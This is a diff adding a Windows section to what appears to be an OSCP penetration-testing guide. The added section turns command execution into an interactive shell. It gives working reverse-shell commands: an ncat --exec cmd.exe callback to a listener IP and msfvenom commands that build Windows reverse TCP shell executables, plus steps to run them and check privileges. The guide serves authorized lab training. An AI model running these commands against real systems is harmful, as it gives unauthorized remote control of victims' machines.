@@ -143,6 +143,72 @@ This requires **Bash** with `/dev/tcp` support. Netcat is not required on the ta
 
 **What failure means:** check listener binding, `LHOST`, routing, egress filtering, quoting, URL encoding, command length and execution context. Avoid repeatedly firing unverified payloads.
 
+### Windows RCE-to-shell PoCs — Ncat and Windows executable
+
+Use only on an explicitly authorized Windows OSCP practice machine after verifying command execution. These are examples for obtaining an interactive foothold; they do not elevate privileges or bypass Windows security controls.
+
+**1. Confirm Windows execution and architecture.** Through the verified command-execution interface, run:
+
+```cmd
+whoami
+hostname
+ver
+echo %PROCESSOR_ARCHITECTURE%
+echo %PROCESSOR_ARCHITEW6432%
+```
+
+These examples assume cmd.exe. The second architecture variable can reveal a 32-bit process running on 64-bit Windows; verify the actual OS architecture before choosing a payload.
+
+**2. Prepare a listener on Kali.** Use your current reachable VPN address, not the Windows target IP. The examples below reuse the illustrative callback address `192.168.45.219` and port `4444`.
+
+```bash
+ip -br addr
+nc -lvnp 4444
+```
+
+Keep the listener running in a separate terminal.
+
+**3. Option A — Ncat, when already available on the Windows lab machine.**
+
+```cmd
+ncat.exe --exec cmd.exe 192.168.45.219 4444
+```
+
+This is the Nmap Ncat executable, not a guarantee that any program named nc.exe supports the same options. Only use it if it is already available or explicitly provided by your authorized lab. The Windows machine must be able to reach the Kali listener.
+
+**4. Option B — non-Meterpreter Windows reverse TCP shell executable.** On Kali, generate a Windows executable appropriate for your confirmed target architecture:
+
+```bash
+# 64-bit Windows
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.219 LPORT=4444 -f exe -o windows-shell-x64.exe
+
+# 32-bit Windows alternative (choose ONE architecture)
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.219 LPORT=4444 -f exe -o windows-shell-x86.exe
+```
+
+The callback addresses must match your actual reachable Kali VPN IP and listener. These are plain command-shell payloads, not Meterpreter; a normal Netcat listener is appropriate. Only place the chosen file on the assigned target through a verified, authorized lab delivery mechanism. Once the matching executable is present in an approved writable directory, invoke that file through the confirmed Windows command-execution point. For example, in cmd.exe, if the 64-bit file was placed in your current directory:
+
+```cmd
+.\windows-shell-x64.exe
+```
+
+Use the x86 filename instead if that was the selected architecture. An HTTP RCE input may require correct encoding/quoting. Do not assume a file upload executes the file, and do not bypass endpoint security or turn off protections when execution is blocked.
+
+**5. Verify the callback and effective privileges.** In the received Windows command shell:
+
+```cmd
+whoami
+whoami /all
+hostname
+ipconfig
+```
+
+A callback might run as a web-service or other restricted account. It does **not** imply administrator or SYSTEM rights. Continue with [Windows Privilege Escalation](../04-Privilege-Escalation/windows-privesc.md); review token privileges, service configuration, ACLs and scheduled tasks. Use [Pivoting and Tunneling](../07-Pivoting/pivoting-tunneling.md) only when a separate in-scope network objective requires it.
+
+**Troubleshooting:** if the listener receives nothing, verify the execution point, Windows architecture, Ncat or executable availability, reachable VPN IP, port, outbound filtering, and process lifetime. Do not repeatedly launch payloads or attempt to disable endpoint protection. Close the session and remove only your own temporary lab artifacts when finished.
+
+**OSCP+ exam policy:** The [official OffSec Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) permits `msfvenom` across targets, subject to the one-target Meterpreter restriction. Other Metasploit modules remain restricted as described in the guide. The examples above use non-Meterpreter shells. A Windows proof screenshot must show the original proof contents from an interactive target shell and the target IP. Recheck the current guide before exam day.
+
 ## 5. Path C — file-upload execution, only after verification
 
 A successful upload is **not** evidence of code execution. First document:
@@ -249,6 +315,7 @@ Record the account, host, working directory, OS, shell type and the exact vulner
 - [ ] Verify the shell account and hostname.
 - [ ] Stabilize only if useful and supported.
 - [ ] After confirmed RCE, choose one authorized Bash or FIFO/Netcat shell PoC, verify the callback and avoid overwriting another file at `/tmp/f`.
+- [ ] On Windows, confirm OS architecture, use the matching authorized Ncat or non-Meterpreter shell method, verify the callback and effective token with `whoami /all`, then assess local privilege escalation.
 - [ ] Distinguish local privilege escalation from pivoting; use only the next step justified by the lab scope.
 - [ ] Save sanitized evidence and note the next privilege-escalation path.
 
